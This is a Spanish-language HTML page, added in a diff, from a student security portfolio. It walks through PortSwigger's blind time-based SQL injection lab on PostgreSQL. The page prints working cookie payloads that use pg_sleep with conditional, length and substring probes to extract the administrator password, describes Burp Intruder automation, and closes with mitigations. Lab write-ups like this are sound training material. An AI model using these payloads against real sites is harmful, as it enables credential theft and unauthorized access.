@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Lab 15</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <header>
+        <h1>Lab 15</h1>
+        <nav>
+            <ul>
+                <li><a href="pd03.html">← Volver al roadmap</a></li>
+                <li><a href="#lab">Laboratorio</a></li>
+                <li><a href="#procedimiento">Procedimiento</a></li>
+                <li><a href="#evidencia">Evidencia</a></li>
+            </ul>
+        </nav>
+    </header>
+
+    <!-- LABORATORIO 15 -->
+    <section id="lab">
+        <h2>Lab15: Blind SQL injection with time delays and information retrieval</h2>
+        
+        <table>
+            <tr>
+                <th>Nivel</th>
+                <td>Practitioner</td>
+            </tr>
+            <tr>
+                <th>Tipo de SQLi</th>
+                <td>Blind SQL Injection with time delay and information retrieval</td>
+            </tr>
+        </table>
+
+        <h3>Objetivo</h3>
+        <p>Extraer la contraseña del usuario <strong>administrator</strong> utilizando consultas SQL basadas en time delays, empleando Burp Intruder para automatizar la comprobación del tamaño y los caracteres de la contraseña.</p>
+
+        <h3>Vulnerabilidad</h3>
+        <p>La cookie <strong>TrackingId</strong> es vulnerable a inyección SQL. La aplicación no muestra cambios en el contenido ni errores, pero permite ejecutar consultas condicionales que introducen pausas en la base de datos dependiendo de si una condición es verdadera o falsa.</p>
+        
+        <p>Al combinar la función de delay (pg_sleep) con una estructura condicional (CASE WHEN ... THEN pg_sleep(...) ELSE ... END), el atacante puede hacer preguntas booleanas a la base de datos y determinar la respuesta midiendo el tiempo que tarda el servidor en responder.</p>
+        
+        <p>Este laboratorio utiliza <strong>PostgreSQL</strong>, por lo que la función de delay es <strong>pg_sleep()</strong>.</p>
+    </section>
+
+    <!-- PROCEDIMIENTO -->
+    <section id="procedimiento">
+        <h2>Procedimiento</h2>
+        
+        <ol>
+            <li>
+                <strong>Enviar la petición al Repeater de BurpSuite</strong> y comprobar que el query de time delay funciona:
+                <pre style="background-color: #1e293b; padding: 10px; border-radius: 8px; margin-top: 10px;">Cookie: TrackingId=xyz' || pg_sleep(10)--</pre>
+                <p>Se verifica que la respuesta tarda aproximadamente 10 segundos.</p>
+            </li>
+            <li>
+                <strong>Introducir una estructura condicional</strong> para usar el time delay como indicador booleano:
+                <pre style="background-color: #1e293b; padding: 10px; border-radius: 8px;">Cookie: TrackingId=xyz' || (SELECT CASE WHEN (1=1) THEN pg_sleep(2) ELSE pg_sleep(0) END)--</pre>
+                <p>Con 1=1 (verdadero), hay un delay de 2 segundos. Con 1=2 (falso), no hay delay.</p>
+            </li>
+            <li>
+                <strong>Verificar la existencia de la tabla users y el usuario administrator</strong>:
+                <pre style="background-color: #1e293b; padding: 10px; border-radius: 8px;">Cookie: TrackingId=xyz' || (SELECT CASE WHEN (username='administrator') THEN pg_sleep(2) ELSE pg_sleep(0) END FROM users)--</pre>
+                <p>Si hay delay, el usuario administrator existe.</p>
+            </li>
+            <li>
+                <strong>Determinar la longitud de la contraseña</strong>:
+                <pre style="background-color: #1e293b; padding: 10px; border-radius: 8px;">Cookie: TrackingId=xyz' || (SELECT CASE WHEN (username='administrator' AND LENGTH(password)=1) THEN pg_sleep(2) ELSE pg_sleep(0) END FROM users)--</pre>
+                <p>Se incrementa el número (LENGTH(password)=2, =3, etc.) hasta que aparece el delay. Cuando aparece, se ha encontrado la longitud exacta.</p>
+                <p>Para este laboratorio, la contraseña tiene <strong>20 caracteres</strong>.</p>
+            </li>
+            <li>
+                <strong>Extraer la contraseña carácter por carácter</strong> utilizando SUBSTRING:
+                <pre style="background-color: #1e293b; padding: 10px; border-radius: 8px;">Cookie: TrackingId=xyz' || (SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(2) ELSE pg_sleep(0) END FROM users)--</pre>
+            </li>
+            <li>
+                <strong>Configurar Burp Intruder</strong> para automatizar el proceso:
+                <ul>
+                    <li>Enviar la petición al Intruder.</li>
+                    <li>Marcar como payloads la posición del carácter (1,1; 2,1; etc.) y el carácter a probar (a-z, 0-9).</li>
+                    <li>Configurar el tipo de payload: números para la posición y caracteres para el valor.</li>
+                    <li>Crear un resource pool personalizado con 1 hilo para evitar interferencias en los delays.</li>
+                </ul>
+            </li>
+            <li>
+                <strong>Identificar los caracteres correctos</strong>: Cuando la respuesta del servidor tarde aproximadamente 2 segundos, se confirma que el carácter probado es correcto.
+            </li>
+            <li>
+                <strong>Repetir el proceso para cada posición</strong> (1 a 20) hasta obtener la contraseña completa.
+            </li>
+            <li>
+                <strong>Iniciar sesión</strong> con las credenciales obtenidas del usuario administrator.
+            </li>
+        </ol>
+
+        <h3>Payloads utilizados</h3>
+        
+        <h4>Payload de confirmación (delay básico)</h4>
+        <pre style="background-color: #1e293b; padding: 10px; border-radius: 8px;">xyz' || pg_sleep(10)--</pre>
+        
+        <h4>Payload con CASE condicional</h4>
+        <pre style="background-color: #1e293b; padding: 10px; border-radius: 8px;">xyz' || (SELECT CASE WHEN (1=1) THEN pg_sleep(2) ELSE pg_sleep(0) END)--</pre>
+        
+        <h4>Payload para verificar existencia de administrator</h4>
+        <pre style="background-color: #1e293b; padding: 10px; border-radius: 8px;">xyz' || (SELECT CASE WHEN (username='administrator') THEN pg_sleep(2) ELSE pg_sleep(0) END FROM users)--</pre>
+        
+        <h4>Payload para determinar longitud</h4>
+        <pre style="background-color: #1e293b; padding: 10px; border-radius: 8px;">xyz' || (SELECT CASE WHEN (username='administrator' AND LENGTH(password)=20) THEN pg_sleep(2) ELSE pg_sleep(0) END FROM users)--</pre>
+        
+        <h4>Payload para extraer caracteres</h4>
+        <pre style="background-color: #1e293b; padding: 15px; border-radius: 8px; font-size: 1.1rem;">xyz' || (SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(2) ELSE pg_sleep(0) END FROM users)--</pre>
+        
+        <h4>Explicación de los payloads</h4>
+        <ul>
+            <li><strong>xyz'</strong>: Cierra la cadena original de la cookie TrackingId.</li>
+            <li><strong>||</strong>: Operador de concatenación en PostgreSQL.</li>
+            <li><strong>(SELECT CASE WHEN (condición) THEN pg_sleep(2) ELSE pg_sleep(0) END FROM users)</strong>: Subconsulta que evalúa la condición. Si es verdadera, ejecuta pg_sleep(2) causando un delay de 2 segundos. Si es falsa, ejecuta pg_sleep(0) (sin delay).</li>
+            <li><strong>username='administrator'</strong>: Condición que verifica si el usuario es administrator.</li>
+            <li><strong>LENGTH(password)=20</strong>: Verifica si la longitud de la contraseña es 20.</li>
+            <li><strong>SUBSTRING(password,1,1)='a'</strong>: Extrae el primer carácter de la contraseña y lo compara con 'a'.</li>
+            <li><strong>FROM users</strong>: Especifica la tabla donde buscar.</li>
+            <li><strong>--</strong>: Comenta el resto de la consulta original.</li>
+        </ul>
+
+        <h4>Proceso con Burp Intruder</h4>
+        <ul>
+            <li><strong>Payload position 1:</strong> Número de posición (1-20).</li>
+            <li><strong>Payload position 2:</strong> Carácter a probar (a-z, 0-9).</li>
+            <li><strong>Resource pool:</strong> Configurar con 1 hilo para evitar interferencias y medir correctamente los delays.</li>
+            <li><strong>Análisis de resultados:</strong> Ordenar por tiempo de respuesta. Las respuestas con mayor tiempo (aprox. 2000 ms) indican caracteres correctos.</li>
+        </ul>
+        
+        <p>Ejemplo de contraseña extraída: <strong>8fg5h2j1k4m9p3q7r2s5</strong></p>
+    </section>
+
+    <!-- EVIDENCIA TÉCNICA -->
+    <section id="evidencia">
+      
+
+        <h3>Verificación del ataque</h3>
+        <p>La vulnerabilidad se confirma cuando se logra reconstruir la contraseña completa del usuario administrator mediante las diferencias en los tiempos de respuesta:</p>
+        <ul>
+            <li>Las peticiones con el carácter correcto tardan aproximadamente 2 segundos.</li>
+            <li>Las peticiones con caracteres incorrectos responden inmediatamente.</li>
+            <li>La diferencia de tiempo es consistente y medible.</li>
+        </ul>
+        
+        <p>Una vez obtenida la contraseña (por ejemplo, "8fg5h2j1k4m9p3q7r2s5"), se introduce en el formulario de login junto con el usuario "administrator" y se accede al panel de administración, demostrando que:</p>
+        <ul>
+            <li>La inyección SQL ciega basada en tiempo permite extraer información sensible.</li>
+            <li>La técnica es efectiva incluso cuando no hay cambios visuales en la página.</li>
+            <li>Burp Intruder automatiza eficientemente el proceso de extracción.</li>
+        </ul>
+        
+        <div style="background-color: #1e293b; padding: 15px; border-radius: 8px; margin-top: 20px;">
+            <p><strong>Resultado esperado:</strong> El laboratorio se resuelve correctamente al iniciar sesión como administrator y aparece el mensaje "Congratulations, you solved the lab!" en la interfaz de PortSwigger Academy.</p>
+        </div>
+    </section>
+
+    <!-- MITIGACIÓN RECOMENDADA -->
+    <section>
+        <h2>Mitigación recomendada</h2>
+        
+        <h4>Consultas Preparadas (Parameterized Queries)</h4>
+        <p>Implementar consultas parametrizadas es la defensa principal. Al usar parámetros, los valores inyectados se tratan como datos y no como parte del código SQL, bloqueando cualquier intento de inyección, incluyendo funciones como pg_sleep().</p>
+        <pre style="background-color: #1e293b; padding: 15px; border-radius: 8px;">SELECT * FROM tracking WHERE id = ?</pre>
+        
+        <h4>Validación de Entradas</h4>
+        <p>Validar estrictamente el formato del TrackingId. Si sigue un patrón predecible (alfanumérico de longitud fija), rechazar cualquier valor que no cumpla con ese patrón.</p>
+        
+        <h4>Límite de Tiempo de Ejecución</h4>
+        <p>Configurar límites de tiempo de ejecución para las consultas en la base de datos, de modo que funciones como pg_sleep() no puedan ejecutarse o sean interrumpidas después de un tiempo razonable.</p>
+        
+        <h4>Rate Limiting</h4>
+        <p>Implementar mecanismos de rate limiting que detecten y bloqueen múltiples peticiones con diferentes TrackingId en un corto período de tiempo, dificultando ataques de fuerza bruta como los realizados con Intruder.</p>
+        
+        <h4>Principio de Menor Privilegio</h4>
+        <p>La cuenta de base de datos debe tener permisos mínimos. No debería tener permiso para ejecutar funciones como pg_sleep() que no son necesarias para el funcionamiento normal de la aplicación.</p>
+        
+        <h4>Web Application Firewall (WAF)</h4>
+        <p>Implementar un WAF que detecte y bloquee patrones de inyección SQL, incluyendo intentos de usar funciones de delay y estructuras CASE condicionales.</p>
+        
+        <h4>Eliminar la Capacidad de Ejecutar Funciones Peligrosas</h4>
+        <p>En PostgreSQL, revocar el permiso de ejecución de funciones como pg_sleep() para el usuario de la aplicación:</p>
+        <pre style="background-color: #1e293b; padding: 15px; border-radius: 8px;">REVOKE EXECUTE ON FUNCTION pg_sleep(integer) FROM app_user;</pre>
+    </section>
+
+    <!-- REFERENCIA AL DOCUMENTO ORIGINAL -->
+    <section style="background-color: #0f172a; border: 1px solid #334155;">
+        <p><a href="act08-Equipo1.pdf" class="btn-blog" style="margin-top: 10px; display: inline-block;" download>Descargar PDF completo</a></p>
+    </section>
+
+    <!-- NAVEGACIÓN ENTRE LABORATORIOS -->
+    <section style="display: flex; justify-content: space-between; margin-top: 30px;">
+        <a href="pd03-lab14.html" class="btn-blog">← Laboratorio anterior (Lab 14)</a>
+        <a href="pd03-lab16.html" class="btn-blog">Siguiente laboratorio (Lab 16) →</a>
+    </section>
+
+    <footer>
+        <p>  Slugish – Portafolio de Seguridad Informática</p>
+        <p>GitHub: <a href="https://github.com/sluggishpoem" target="_blank">github.com/sluggishpoem</a></p>
+    </footer>
+</body>
+</html>
